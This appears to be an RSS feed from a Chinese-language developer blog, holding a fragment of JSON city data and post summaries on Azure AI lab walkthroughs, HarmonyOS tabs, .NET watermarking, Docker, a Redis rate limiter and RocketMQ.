&amp;#34;山西&amp;#34;, &amp;#34;post_code&amp;#34;: null, &amp;#34;area_code&amp;#34;: null, &amp;#34;ctime&amp;#34;: null }, { &amp;#34;id&amp;#34;: 23, &amp;#34;pid&amp;#34;: 0, &amp;#34;city_code&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;city_name&amp;#34;: &amp;#34;陕西&amp;#34;, &amp;#34;post_code&amp;#34;: null, &amp;#34;area_code&amp;#34;: null, &amp;#34;ctime&amp;#34;: null }, { &amp;#34;id&amp;#34;: 24, &amp;#34;pid&amp;#34;: 0, &amp;#34;city_code&amp;#34;: &amp;#34;101020100&amp;#34;, &amp;#34;city_name&amp;#34;: &amp;#34;上海&amp;#34;, &amp;#34;post_code&amp;#34;: &amp;#34;200000&amp;#34;, &amp;#34;area_code&amp;#34;: &amp;#34;021&amp;#34;, &amp;#34;ctime&amp;#34;: &amp;#34;2024-06-11 17:30:08&amp;#34; }, { &amp;#34;id&amp;#34;: 25, &amp;#34;pid&amp;#34;: 0, &amp;#34;city_code&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;city_name&amp;#34;: &amp;#34;四川&amp;#34;, &amp;#34;post_code&amp;#34;: null, &amp;#34;area_code&amp;#34;: null, &amp;#34;ctime&amp;#34;: null }, { &amp;#34;id&amp;#34;: 26, &amp;#34;pid&amp;#34;: 0, &amp;#34;city_code&amp;#34;: &amp;#34;101030100&amp;#34;, &amp;#34;city_name&amp;#34;: &amp;#34;天津&amp;#34;, &amp;#34;post_code&amp;#34;: &amp;#34;300000&amp;#34;, &amp;#34;area_code&amp;#34;: &amp;#34;022&amp;#34;, &amp;#34;ctime&amp;#34;: &amp;#34;2024-06-11 17:30:08&amp;#34; }, { &amp;#34;id&amp;#34;: 27, &amp;#34;pid&amp;#34;: 0, &amp;#34;city_code&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;city_name&amp;#34;: &amp;#34;西藏&amp;#34;, &amp;#34;post_code&amp;#34;: null, &amp;#34;area_code&amp;#34;: null, &amp;#34;ctime&amp;#34;: null }, { &amp;#34;id&amp;#34;: 28, &amp;#34;pid&amp;#34;: 0, &amp;#34;city_code&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;city_name&amp;#34;: &amp;#34;新疆&amp;#34;, &amp;#34;post_code&amp;#34;: null, &amp;#34;area_code&amp;#34;: null, &amp;#34;ctime&amp;#34;: null }, { &amp;#34;id&amp;#34;: 29, &amp;#34;pid&amp;#34;: 0, &amp;#34;city_code&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;city_name&amp;#34;: &amp;#34;云南&amp;#34;, &amp;#34;post_code&amp;#34;: null, &amp;#34;area_code&amp;#34;: null, &amp;#34;ctime&amp;#34;: null }, { &amp;#34;id&amp;#34;: 30, &amp;#34;pid&amp;#34;: 0, &amp;#34;city_code&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;city_name&amp;#34;: &amp;#34;浙江&amp;#34;, &amp;#34;post_code&amp;#34;: null, &amp;#34;area_code&amp;#34;: null, &amp;#34;ctime&amp;#34;: null }, { &amp;#34;id&amp;#34;: 31, &amp;#34;pid&amp;#34;: 0, &amp;#34;city_code&amp;#34;: &amp;#34;101040100&amp;#34;, &amp;#34;city_name&amp;#34;: &amp;#34;重庆&amp;#34;, &amp;#34;post_code&amp;#34;: null, &amp;#34;area_code&amp;#34;: &amp;#34;023&amp;#34;, &amp;#34;ctime&amp;#34;: &amp;#34;2024-06-11 17:30:08&amp;#34; }, { &amp;#34;id&amp;#34;: 32, &amp;#34;pid&amp;#34;: 0, &amp;#34;city_code&amp;#34;: &amp;#34;101320101&amp;#34;, &amp;#34;city_name&amp;#34;: &amp;#34;香港&amp;#34;, &amp;#34;post_code&amp;#34;: &amp;#34;999077&amp;#34;, &amp;#34;area_code&amp;#34;: &amp;#34;+852&amp;#34;, &amp;#34;ctime&amp;#34;: &amp;#34;2024-06-11 17:03:38&amp;#34; }, { &amp;#34;id&amp;#34;: 33, &amp;#34;pid&amp;#34;: 0, &amp;#34;city_code&amp;#34;: &amp;#34;101330101&amp;#34;, &amp;#34;city_name&amp;#34;: &amp;#34;澳门&amp;#34;, &amp;#34;post_code&amp;#34;: &amp;#34;999078&amp;#34;, &amp;#34;area_code&amp;#34;: &amp;#34;+853&amp;#34;, &amp;#34;ctime&amp;#34;: &amp;#34;2024-06-11 17:03:39&amp;#34; }, { &amp;#34;id&amp;#34;: 34, &amp;#34;pid&amp;#34;: 0, &amp;#34;city_code&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;city_name&amp;#34;: &amp;#34;台湾&amp;#34;, &amp;#34;post_code&amp;#34;: null, &amp;#34;area_code&amp;#34;: null, &amp;#34;ctime&amp;#34;: null }, { &amp;#34;id&amp;#34;: 35, &amp;#34;pid&amp;#34;: 2, &amp;#34;city_code&amp;#34;: &amp;#34;101220601&amp;#34;, &amp;#34;city_name&amp;#34;: &amp;#34;安庆&amp;#34;, &amp;#34;post_code&amp;#34;: &amp;#34;246000&amp;#34;, &amp;#34;area_code&amp;#34;: &amp;#34;0556&amp;#34;, &amp;#34;ctime&amp;#34;: &amp;#34;2024-06-11 17:30:10&amp;#34; }, { &amp;#34;id&amp;#34;: 36, &amp;#34;pid&amp;#34;: 2, &amp;#34;city_code&amp;#34;: &amp;#34;101220201&amp;#34;, &amp;#34;city_name&amp;#34;: &amp;#34;蚌埠&amp;#34;, &amp;#34;post_code&amp;#34;: &amp;#34;233000&amp;#34;, &amp;#34;area_code&amp;#34;: &amp;#34;0552&amp;#34;, &amp;#34;ctime&amp;#34;: &amp;#34;2024-06-11 17:30:10&amp;#34; }, { &amp;#34;id&amp;#34;: 37, &amp;#34;pid&amp;#34;: 3400, &amp;#34;city_code&amp;#34;: &amp;#34;101220105&amp;#34;, &amp;#34;city_name&amp;#34;: &amp;#34;巢湖市&amp;#34;, &amp;#34;post_code&amp;#34;: &amp;#34;238000&amp;#34;, &amp;#34;area_code&amp;#34;: &amp;#34;0551&amp;#34;, &amp;#34;ctime&amp;#34;: &amp;#34;2024-06-11 17:03:40&amp;#34; }, { &amp;#34;id&amp;#34;: 38, &amp;#34;pid&amp;#34;: 2, &amp;#34;city_code&amp;#34;: &amp;#34;101221701&amp;#34;, &amp;#34;city_name&amp;#34;: &amp;#34;池州&amp;#34;, &amp;#34;post_code&amp;#34;: &amp;#34;247100&amp;#34;, &amp;#34;area_code&amp;#34;: &amp;#34;0566&amp;#34;, &amp;#34;ctime&amp;#34;: &amp;#34;2024-06-11 17:30:10&amp;#34; }, { &amp;#34;id&amp;#34;: 39, &amp;#34;pid&amp;#34;: 2, &amp;#34;city_code&amp;#34;: &amp;#34;101221101&amp;#34;, &amp;#34;city_name&amp;#34;: &amp;#34;滁州&amp;#34;, &amp;#34;post_code&amp;#34;: &amp;#34;239000&amp;#34;, &amp;#34;area_code&amp;#34;: &amp;#34;0550&amp;#34;, &amp;#34;ctime&amp;#34;: &amp;#34;2024-06-11 17:30:10&amp;#34; }, { &amp;#34;id&amp;#34;: 40, &amp;#34;pid&amp;#34;: 2, &amp;#34;city_code&amp;#34;: &amp;#34;101220801&amp;#34;, &amp;#34;city_name&amp;#34;: &amp;#34;阜阳&amp;#34;, &amp;#34;post_code&amp;#34;: &amp;#34;236000&amp;#34;, &amp;#34;area_code&amp;#34;: &amp;#34;0558&amp;#34;, &amp;#34;ctime&amp;#34;: &amp;#34;2024-06-11 17:30:10&amp;#34; }, { &amp;#34;id&amp;#34;: 41, &amp;#34;pid&amp;#34;: 2, &amp;#34;city_code&amp;#34;: &amp;#34;101221201&amp;#34;, &amp;#34;city_name&amp;#34;: &amp;#34;淮北&amp;#34;, &amp;#34;post_code&amp;#34;: &amp;#34;235000&amp;#34;, &amp;#34;area_code&amp;#34;: &amp;#34;0561&amp;#34;, &amp;#34;ctime&amp;#34;: &amp;#34;2024-06-11 17:30:11&amp;#34; }, { &amp;#34;id&amp;#34;: 42, &amp;#34;pid&amp;#34;: 2, &amp;#34;city_code&amp;#34;: &amp;#34;101220401&amp;#34;, &amp;#34;city_name&amp;#34;: &amp;#34;淮南&amp;#34;, &amp;#34;post_code&amp;#34;: &amp;#34;232000&amp;#34;, &amp;#34;area_code&amp;#34;: &amp;#34;0554&amp;#34;, &amp;#34;ctime&amp;#34;: &amp;#34;2024-06-11 17:30:11&amp;#34; }, { &amp;#34;id&amp;#34;: 43, &amp;#34;pid&amp;#34;: 2, &amp;#34;city_code&amp;#34;: &amp;#34;101221001&amp;#34;, &amp;#34;city_name&amp;#34;: &amp;#34;黄山市&amp;#34;, &amp;#34;post_code&amp;#34;: &amp;#34;245000&amp;#34;, &amp;#34;area_code&amp;#34;: &amp;#34;0559&amp;#34;, &amp;#34;ctime&amp;#34;: &amp;#34;2024-06-11 21:23:56&amp;#34; }, { &amp;#34;id&amp;#34;: 44, &amp;#34;pid&amp;#34;: 2, &amp;#34;city_code&amp;#34;: &amp;#34;101221501&amp;#34;, &amp;#34;city_name&amp;#34;: &amp;#34;六安&amp;#34;, &amp;#34;post_code&amp;#34;: &amp;#34;237000&amp;#34;, &amp;#34;area_code&amp;#34;: &amp;#34;0564&amp;#34;, &amp;#34;ctime&amp;#34;: &amp;#34;2024-06-11 17:30:11&amp;#34; }, { &amp;#34;id&amp;#34;: 45, &amp;#34;pid&amp;#34;: 2, &amp;#34;city_code&amp;#34;: &amp;#34;101220501&amp;#34;, &amp;#34;city_name&amp;#34;: &amp;#34;马鞍山&amp;#34;, &amp;#34;post_code&amp;#34;: &amp;#34;243000&amp;#34;, &amp;#34;area_code&amp;#34;: &amp;#34;0555&amp;#34;, &amp;#34;ctime&amp;#34;: &amp;#34;2024-06-11 17:30:11&amp;#34; }, { &amp;#34;id&amp;#34;: 46, &amp;#34;pid&amp;#34;: 2, &amp;#34;city_code&amp;#34;: &amp;#34;101220701&amp;#34;, &amp;#34;city_name&amp;#34;: &amp;#34;宿州&amp;#34;, &amp;#34;post_code&amp;#34;: &amp;#34;234000&amp;#34;, &amp;#34;area_code&amp;#34;: &amp;#34;0557&amp;#34;, &amp;#34;ctime&amp;#34;: &amp;#34;2024-06-11 17:30:11&amp;#34; }, { &amp;#34;id&amp;#34;: 47, &amp;#34;pid&amp;#34;: 2, &amp;#34;city_code&amp;#34;: &amp;#34;101221301&amp;#34;, &amp;#34;city_name&amp;#34;: &amp;#34;铜陵&amp;#34;, &amp;#34;post_code&amp;#34;: &amp;#34;244000&amp;#34;, &amp;#34;area_code&amp;#34;: &amp;#34;0562&amp;#34;, &amp;#34;ctime&amp;#34;: &amp;#34;2024-06-11 17:30:12&amp;#34; }, { &amp;#34;id&amp;#34;: 48, &amp;#34;pid&amp;#34;: 2, &amp;#34;city_code&amp;#34;: &amp;#34;101220301&amp;#34;, &amp;#34;city_name&amp;#34;: &amp;#34;芜湖市&amp;#34;, &amp;#34;post_code&amp;#34;: &amp;#34;241000&amp;#34;, &amp;#34;area_code&amp;#34;: &amp;#34;0553&amp;#34;, &amp;#34;ctime&amp;#34;: &amp;#34;2024-06-11 21:23:57&amp;#34; }, { &amp;#34;id&amp;#34;: 49, &amp;#34;pid&amp;#34;: 2, &amp;#34;city_code&amp;#34;: &amp;#34;101221401&amp;#34;, &amp;#34;city_name&amp;#34;: &amp;#34;宣城&amp;#34;, &amp;#34;post_code&amp;#34;: &amp;#34;242000&amp;#34;, &amp;#34;area_code&amp;#34;: &amp;#34;0563&amp;#34;, &amp;#34;ctime&amp;#34;: &amp;#34;2024-06-11 17:30:12&amp;#34; }, { &amp;#34;id&amp;#34;: 50, &amp;#34;pid&amp;#34;: 2, &amp;#34;city_code&amp;#34;: &amp;#34;101220901&amp;#34;, &amp;#34;city_name&amp;#34;: &amp;#34;亳州&amp;#34;, &amp;#34;post_code&amp;#34;: &amp;#34;236800&amp;#34;, &amp;#34;area_code&amp;#34;: &amp;#34;0558&amp;#34;, &amp;#34;ctime&amp;#34;: &amp;#34;2024-06-11 17:30:12&amp;#34; } //.</description></item><item><title>Azure AI Document Intelligence</title><link>https://qfsyso.github.io/posts/azure-ai-document-intelligence/</link><pubDate>Fri, 07 Jun 2024 23:06:10 +0000</pubDate><guid>https://qfsyso.github.io/posts/azure-ai-document-intelligence/</guid><description>创建智能文档处理解决方案 在第二级中，这3个模块，每一个中都有不同的任务操作，这些操作包括使用 Azure 进行实际创建服务操作或者使用代码调用 Azure的服务，这些代码可以使用python或者C#，这些进行选择。所有的模块内的考试是通过一个邮件的方式进行告知。
https://learn.microsoft.com/en-us/credentials/applied-skills/create-intelligent-document-solution-azure-ai/#applied-skill-take-the-assessment
start
登陆实验环境 加载成功后会出现虚拟机器登陆界面，找到右侧的 Step1 中的用户名密码。登陆 获取实验账号并登陆 Azure 进入到机器后，点击桌面的 Email 图片，打开我们的实验目标。 打开桌面的 email 后，会出现如下的界面。这里主要关注两点： 一个是左侧蓝色的部分：Inbox，这里包括环境信息以及实验目标考题。 另一个是浏览器的页签中的第二个，也就是登陆 Azure 的环境网址
点击上图的 Azure 标签页，进入登陆页面，用email提供的账号密码登陆
试验一： Create a prototype 点击邮件中的 Create a prototype 菜单会出现具体的内容要求。
在第一个实验中主要是使用微软的只能存储服务，并且创建的时候要符合要求，这个服务要满足的要求是要保存所给的文件成Json文件，之后在保存到 Azure 的存储服务中。
实验流程操作 首先到 Azure 中，搜索所给出的资源组，选择 RG1开头的资源组 进入到资源组后，点击创建按钮。 在搜索框中输入document intelligence 点击选择。 点击 文档智能服务
进入到服务后，点击蓝色的创建按钮。 在这里直接选择默认的订阅以及资源组，Region 目前建议选择 Japan East（如果后面的步骤，在运行分析文档时，遇到权限不足问题，请在此步骤选择其他 Region ）
在这里名字填入：from-document-xxx，如（from-document-01）价格层要选择免费层，也就是下图中的 Free F0，之后点击预览创建按钮。
预览没有问题后，直接点击创建按钮。 创建完毕后，在页面中点击 Go to resource 按钮
之后点击 Go to Document Intelligence Studio 按钮 进入到服务页面后，下滑页面，点击 Invoices 的 Try it out。</description></item><item><title>Azure OpenAI Build Natural Language</title><link>https://qfsyso.github.io/posts/azure-openai-build-natural-language/</link><pubDate>Fri, 07 Jun 2024 01:03:12 +0000</pubDate><guid>https://qfsyso.github.io/posts/azure-openai-build-natural-language/</guid><description>https://learn.microsoft.com/en-us/credentials/applied-skills/build-natural-language-solution-azure-ai/#applied-skill-take-the-assessment?ocid=reactor
start 进入环境中，点击Step 1，然后点击Password右边的T，登录环境 双击打开桌面的Email文件 对Inbox的内容进行逐个点击，其中Existing Environment包含了微软官方提供的Azure的用户名和密码，proof of concept、Invoice validation、chatbot backend 分别表示的是本次考试的三大任务的具体要求 将邮箱中Existing Environment的用户名和密码依次复制到Azure的标签页面中，并点击Sign in完成Azure的登录
试验一： Proof of Concept (POC) 点击邮件中的 Proof of Concept (POC) 菜单会出现具体的内容要求，如下图所示。
在第一个实验中主要是使用微软的 language 服务，并且创建的时候要符合要求，这个服务要满足客户自定义文本标准和 NER。 在实验中另外一个要求是需要使用代码最后调用这个你创建服务。 流程操作 首先在登录主页面搜索栏 搜索RG1，并点击Resource Groups下面的RG1 进入后点击 Create 按钮 之后在首页内搜索language service 点击进入到 Language service 后，点击 Create 之后点击右下方的第二个 select 按钮 选择好之后，点击下方的按钮 continue to create your resource
在配置页面，按照我们的题目要求，在 Region 中选择 North Europe， 其中 Name 从邮件中找，在 Proof of concept 这里 lang开头的这个名字，作为刚才创建资源的 Name 值 主要需要注意的是在 Pricing tier层里，需要选择 Free F0 的这个，这一点也是题目要求的。 下面选择 Existing storege account ，在存储账户这里，需要选择题目要求的以sa开头的这个账户。</description></item><item><title>Azure AI Develop Generative AI solutions</title><link>https://qfsyso.github.io/posts/azure-ai-develop-generative-ai-solutions/</link><pubDate>Thu, 06 Jun 2024 00:18:03 +0000</pubDate><guid>https://qfsyso.github.io/posts/azure-ai-develop-generative-ai-solutions/</guid><description>Start https://learn.microsoft.com/en-us/credentials/applied-skills/develop-generative-ai-solutions-with-azure-openai-service/#applied-skill-take-the-assessment
部署Azure OpenAI 服务 ​
点击Step 1，然后点击Password右边的T ​
鼠标双击Email ​ 对Inbox的内容进行逐个点击，其中Existing Environment包含了微软官方提供的Azure的用户名和密码，Validate proof of concept、Company chatbot、Developer tasks和Use company data分别表示的是本次考试的四大任务的具体要求
切换到Azure登录的标签页
​ 将邮箱中Existing Environment的用户名和密码依次复制到Azure的标签页面中，并点击Sign in完成Azure的登录
然后在浏览器中输入URL：https://portal.azure.com/#home，点击Azure AI services
​ 其中Resource group、Pricing tier勾选下拉列表的存在项，Name可自行填入(如azureservice)，然后点击Next ​
网络中选择第一项：All networks，然后点击页面左下方的Next Tags可直接点击左下方的Next 然后在Review+submit页面点击Create ​ 等待几十秒后，deployment完成后，点击Deployment details 点击Resource中的名称，如azureservice ​ 点击Endpoints右边的Click here to view endpoints ​ ​
点击Key 1右侧的复制按钮，复制其到C:\files\AzureOpenAIPoc\Python.env中的AZURE_OAI_KEY变量中。 点击Endpoint右侧的复制按钮，分别复制任意一个 KEY 和 EndPoint 到C:\files\AzureOpenAIPoc\Python.env中的AZURE_OAI_KEY 和 AZURE_OAI_ENDPOINT。 然后在浏览器中输入https://portal.azure.com/#home，并点击Name下的名称 点击Go to Azure OpenAI Studio
然后点击Create new deployment
按照下图中的内容进行下拉选择或者填写，其中Select a model勾选为gpt-35-turbo-16k，Deployment name可自定义填写，如gpt_deploy，将Tokens per Minute Rate Limit设置为5K，Enable Dynamic Quota设置为Disabled，最后点击Create： 确保Status为Succeed，则说明部署成功了 将C:\files\AzureOpenAIPoc\Python.</description></item><item><title>Azure OpenAI Language</title><link>https://qfsyso.github.io/posts/azure-openai-language/</link><pubDate>Wed, 05 Jun 2024 00:53:20 +0000</pubDate><guid>https://qfsyso.github.io/posts/azure-openai-language/</guid><description>使用 Azure AI 语言分析文本 每天，世界都会生成大量数据；大部分内容基于文本，其形式包括电子邮件、社交媒体文章、在线评论、业务文档等。 通过应用统计和语义模型的人工智能技术，可以创建从基于文本的数据中提取含义和见解的应用程序。
Azure AI 语言为可轻松集成到你自己的应用程序代码中的常见文本分析技术提供 API。
在本模块中，你将了解如何使用 Azure AI 语言执行以下操作：
检测文本中的语言。 分析文本情绪。 提取关键短语、实体和链接实体。
预配 Azure AI 语言资源 Azure AI 语言旨在帮助从文本中提取信息。 它提供可用于以下各项的功能：
语言检测 - 确定编写文本所用的语言。
关键短语提取 - 标识文本中指示要点的重要单词和短语。
情绪分析 - 量化文本的正负面情绪程度。
命名实体识别 - 检测对实体的引用，包括人员、位置、时间段、组织等。
实体链接 - 通过提供指向维基百科文章的参考链接来标识特定实体。
用于文本分析的 Azure 资源 若要使用 Azure AI 语言来分析文本，必须在 Azure 订阅中为其预配资源。
在 Azure 订阅中预配适当的资源后，可以使用其终结点及其密钥之一从代码中调用 Azure AI 语言 API。 可以通过向 REST 接口提交 JSON 格式的请求，或者通过使用特定于编程语言的任何可用 SDK 来调用 Azure AI 语言 API。
注意
本模块的后续单元中的代码示例显示了与 REST 接口交换的 JSON 请求和响应。 使用 SDK 时，会通过用于封装相同数据值的适当对象和方法对 JSON 请求进行抽象。 在本模块后面的练习中，你将有机会亲自尝试使用适用于 C# 或 Python 的 SDK。</description></item><item><title>Azure OpenAI Natural Language</title><link>https://qfsyso.github.io/posts/azure-openai-natural-language/</link><pubDate>Tue, 04 Jun 2024 23:02:14 +0000</pubDate><guid>https://qfsyso.github.io/posts/azure-openai-natural-language/</guid><description>简介 Azure OpenAI 为开发人员提供了一个平台，用于在 Python 和 C# SDK 以及 REST API 的帮助下向其应用程序添加人工智能功能。 该平台提供了各种 AI 模型，每个模型都专用于不同的任务，这些任务可通过 Azure OpenAI 服务进行部署。
本模块指导你了解如何将 Azure OpenAI 构建到自己的应用程序中，为你提供一个使用生成式 AI 开发解决方案的起点。
将 Azure OpenAI 集成到应用中 Azure OpenAI 提供 C# 和 Python SDK 以及 REST API，开发人员可以用来向其应用程序添加 AI 功能。 Azure OpenAI 中的生成式 AI 功能通过模型提供。 Azure OpenAI 服务中可用的模型属于不同的系列，每个系列都有自己的重点。 若要使用这些模型之一，需要通过 Azure OpenAI 服务进行部署。
重要
Azure OpenAI 已发布，但支持负责任地使用该服务的访问权限有限。 用户需要先申请访问权限并获得批准，然后才能创建 Azure OpenAI 资源。
创建 Azure OpenAI 资源 可以通过 Azure 命令行接口 (CLI) 和 Azure 门户部署 Azure OpenAI 资源。 通过 Azure 门户创建 Azure OpenAI 资源类似于部署单个 Azure AI 服务资源，并且是 Azure AI 服务的一部分。</description></item><item><title> HarmonyOS Tabs Component</title><link>https://qfsyso.github.io/posts/harmonyos-tabs-component/</link><pubDate>Sat, 01 Jun 2024 23:52:32 +0000</pubDate><guid>https://qfsyso.github.io/posts/harmonyos-tabs-component/</guid><description>🔮Tabs Tabs(){ TabContent(){ } } example
Tabs({barPosition:BarPosition.End}){ ForEach(this.ilist,(item,index)=&amp;gt;{ TabContent(){ Column( ){ Text(item.title) .fontSize(&amp;#39;18fp&amp;#39;) } .width(&amp;#39;100%&amp;#39;) .height(&amp;#39;100%&amp;#39;) .backgroundColor(&amp;#39;#FFFFFF&amp;#39;) } .tabBar(this.tabTile(index,item.title,item.url1,item.url2)) }) } .vertical(false) .scrollable(true)//huadong .animationDuration(400) .width(&amp;#39;100%&amp;#39;) .backgroundColor(&amp;#39;#fffff1&amp;#39;) //.height(&amp;#39;100vp&amp;#39;) .onChange((value) =&amp;gt; { this.curIndex = value; }) 🎮️tab data interface INav{ title:string; url1:Resource; url2 :Resource; } //... @State ilist:INav[]=[{ title:&amp;#39;index&amp;#39;, url1:$r(&amp;#39;app.media.icon&amp;#39;), url2:$r(&amp;#39;app.media.icon2&amp;#39;) }, { title:&amp;#39;hot&amp;#39;, url1:$r(&amp;#39;app.media.icon&amp;#39;), url2:$r(&amp;#39;app.media.icon2&amp;#39;) }, { title:&amp;#39;my&amp;#39;, url1:$r(&amp;#39;app.media.icon&amp;#39;), url2:$r(&amp;#39;app.media.icon2&amp;#39;) } ]; barPosition:BarPosition.End 底部
barPosition:BarPosition.Start 顶部
🪅Component swpier @Component export default struct swiper1{ public ilist:Array&amp;lt;Resource&amp;gt; =[ $r(&amp;#39;app.</description></item><item><title>Azure OpenAI Solution</title><link>https://qfsyso.github.io/posts/azure-openai-solution/</link><pubDate>Sat, 01 Jun 2024 20:02:53 +0000</pubDate><guid>https://qfsyso.github.io/posts/azure-openai-solution/</guid><description>开始使用 Azure OpenAI 服务 简介 假设你想要生成一个汇总文本和建议代码的支持应用程序。 若要生成此应用，需要利用 ChatGPT 中显示的功能，ChatGPT 是 OpenAI 研究公司构建的聊天机器人，它接受用户的自然语言输入，并返回机器创建的类人响应。
生成式 AI 模型支持 ChatGPT 基于自然语言提示生成新内容（如文本、代码和图像）的能力。 许多生成 AI 模型是深度学习算法的子集。 这些算法支持视觉、语音、语言、决策、搜索等各种工作负载。
Azure OpenAI 服务将这些生成式 AI 模型引入 Azure 平台，使你能够开发功能强大的 AI 解决方案，这些解决方案受益于 Azure 云平台提供的其他服务的安全性、可伸缩性和集成。 这些模型可用于通过 REST API、各种 SDK 和 Studio 接口生成应用程序。 本模块将指导你完成 Azure OpenAI Studio 体验，为你使用生成式 AI 进一步开发解决方案奠定了基础。
访问 Azure OpenAI 服务 使用 Azure OpenAI 构建生成型 AI 解决方案的第一步是在 Azure 订阅中预配 Azure OpenAI 资源。 Azure OpenAI 服务目前处于受限访问状态。 用户需要在 https://aka.ms/oai/access 上申请服务访问权限。
注意
Azure OpenAI 服务已发布，但支持以合乎道德的方式使用该服务的访问权限有限。 可以在此处阅读 Azure OpenAI 服务的 Microsoft 透明度说明。</description></item><item><title>.NET AddWatermark</title><link>https://qfsyso.github.io/posts/.net-addwatermark/</link><pubDate>Sat, 01 Jun 2024 19:18:12 +0000</pubDate><guid>https://qfsyso.github.io/posts/.net-addwatermark/</guid><description>controller [HttpPost] public async Task&amp;lt;IActionResult&amp;gt; AddWatermark(IFormFile file, string watermarkText, string color, int transparency) { if (file != null &amp;amp;&amp;amp; file.Length &amp;gt; 0) { // 将上传的文件保存到服务器 var uploads = Path.Combine(_environment.WebRootPath, &amp;#34;uploads&amp;#34;); if (!Directory.Exists(uploads)) { Directory.CreateDirectory(uploads); } var filePath = Path.Combine(uploads, file.FileName); using (var fileStream = new FileStream(filePath, FileMode.Create)) { await file.CopyToAsync(fileStream); } // 添加水印 using (Image image = Image.FromFile(filePath)) using (Graphics g = Graphics.FromImage(image)) { // 设置水印文本的字体和颜色 Font font = new Font(&amp;#34;Arial&amp;#34;, 20); Color colorValue = ColorTranslator.</description></item><item><title> .NET Dockerhub</title><link>https://qfsyso.github.io/posts/.net-dockerhub/</link><pubDate>Sat, 01 Jun 2024 01:24:22 +0000</pubDate><guid>https://qfsyso.github.io/posts/.net-dockerhub/</guid><description>📚Dockerfile FROM mcr.microsoft.com/dotnet/sdk:8.0 AS build WORKDIR /src COPY [&amp;#34;MyMvcApp.csproj&amp;#34;, &amp;#34;./&amp;#34;] RUN dotnet restore &amp;#34;MyMvcApp.csproj&amp;#34; COPY . . WORKDIR &amp;#34;/src/&amp;#34; RUN dotnet build &amp;#34;MyMvcApp.csproj&amp;#34; -c Release -o /app/build FROM build AS publish RUN dotnet publish &amp;#34;MyMvcApp.csproj&amp;#34; -c Release -o /app/publish FROM base AS final WORKDIR /app COPY --from=publish /app/publish . ENTRYPOINT [&amp;#34;dotnet&amp;#34;, &amp;#34;MyMvcApp.dll&amp;#34;] ✏️ Docker 镜像 docker build -t mymvcapp:latest . 📝在 Docker Hub 上创建仓库 登录 Docker Hub (https://hub.docker.com)。 点击 &amp;ldquo;Create Repository&amp;rdquo;。 输入仓库名称，例如 mymvcapp，然后点击 &amp;ldquo;Create&amp;rdquo;。</description></item><item><title>.NET Redis 10s Rate Limiter Sliding Window Algorithm</title><link>https://qfsyso.github.io/posts/.net-redis-10s-rate-limiter-sliding-window-algorithm/</link><pubDate>Fri, 31 May 2024 06:24:16 +0000</pubDate><guid>https://qfsyso.github.io/posts/.net-redis-10s-rate-limiter-sliding-window-algorithm/</guid><description>在.NET中使用Redis来限制接口请求频率（每10秒只允许请求一次）
NuGet setup StackExchange.Redis
实现速率限制逻辑： 在你的控制器或服务层中，你需要编写一个方法来检查并更新Redis中的速率限制计数器。 设置Redis键： 为每个用户或每个IP地址（取决于你的需求）设置一个唯一的键。这个键将用于存储最后一次请求的时间戳和/或请求计数。 检查时间戳： 当请求到达时，从Redis中获取该键的值（时间戳）。如果键不存在或时间戳超过10秒，则允许请求并更新键的值（设置为当前时间戳）。 处理超过速率的请求： 如果时间戳在10秒内，则拒绝或限制该请求（返回限制状态码）。
private static readonly Lazy&amp;lt;ConnectionMultiplexer&amp;gt; LazyConnection = new Lazy&amp;lt;ConnectionMultiplexer&amp;gt;(() =&amp;gt; { // 配置Redis连接字符串 &amp;#34;localhost,abortConnect=false&amp;#34; return ConnectionMultiplexer.Connect(&amp;#34;localhost:6379&amp;#34;); }); private static ConnectionMultiplexer Connection =&amp;gt; LazyConnection.Value; private static IDatabase Db =&amp;gt; Connection.GetDatabase(); public async Task&amp;lt;ActionResult&amp;gt; MyAction() { IPAddress clientIpAddress = HttpContext.Connection.RemoteIpAddress; string ipAddress = clientIpAddress.ToString(); string redisKey = $&amp;#34;rate-limit:{ipAddress}&amp;#34;; // 构建Redis键名 // 获取当前时间戳（可以是Unix时间戳或任何你选择的格式） long currentTimestamp = DateTimeOffset.UtcNow.ToUnixTimeSeconds(); // 尝试从Redis获取时间戳 var redisValue = await Db.</description></item><item><title>.NET RocketMQ</title><link>https://qfsyso.github.io/posts/.net-rocketmq/</link><pubDate>Wed, 29 May 2024 20:17:33 +0000</pubDate><guid>https://qfsyso.github.io/posts/.net-rocketmq/</guid><description>RocketMQ 是一款由阿里巴巴集团开发并开源给Apache软件基金会的分布式消息及流处理平台。以其高吞吐量、低延迟、高可用性等特点而广受欢迎。支持Java，C++, Python, Go, .NET等。
异步解耦：可以实现上游和下游业务系统的松耦合设计，使得服务部分节点异常不会影响到核心交易系统的正常运转。在电商、金融等分布式系统中，这种解耦设计尤为重要。 削峰填谷：在如秒杀、大促等大型活动中，系统会面临巨大的流量冲击。RocketMQ利用其高性能的消息处理能力，可以有效地应对这种流量冲击，保证系统的稳定运行。 顺序消息：支持顺序消息（分区有序），可以确保消息的先进先出。这在交易系统中的订单创建、支付、退款等流程中尤为重要，因为这些流程对消息的顺序有严格要求。 分布式事务消息：支持分布式事务消息，可以保证分布式事务的强一致性。这在涉及多个服务的分布式系统中非常有用，可以确保数据的一致性和完整性。
RocketMQ优点 高吞吐量和低延迟：能够处理大规模消息流，并提供低延迟的消息传递。这使得它非常适合处理高并发的应用场景，如电子商务和金融交易系统。 可靠性：具有高度可靠的消息传递机制。它支持消息持久化和复制，确保消息不会丢失，并能够在故障发生时进行自动恢复。 分布式扩展：支持水平扩展，可以方便地添加新的消息生产者和消费者来应对负载增加的情况。 易于部署：提供开箱即用的部署方式，非常适合在分布式系统中使用。
RocketMQ架构 生产者（Producer） 用于产生消息的运行实体，通常集成在业务系统的上游。 主题（Topic） 消息传输和存储的分组容器，内部由多个队列组成。 队列（MessageQueue） 消息传输和存储的实际单元容器，类似于其他消息队列中的分区。 消息（Message） RocketMQ 的最小传输单元，具备不可变性。 消费者分组（ConsumerGroup） 发布订阅模型中定义的独立的消费身份分组，用于统一管理多个消费者。 消费者（Consumer） 消费消息的运行实体，集成在业务系统的下游。 订阅关系（Subscription） 发布订阅模型中消息过滤、重试、消费进度的规则配置。
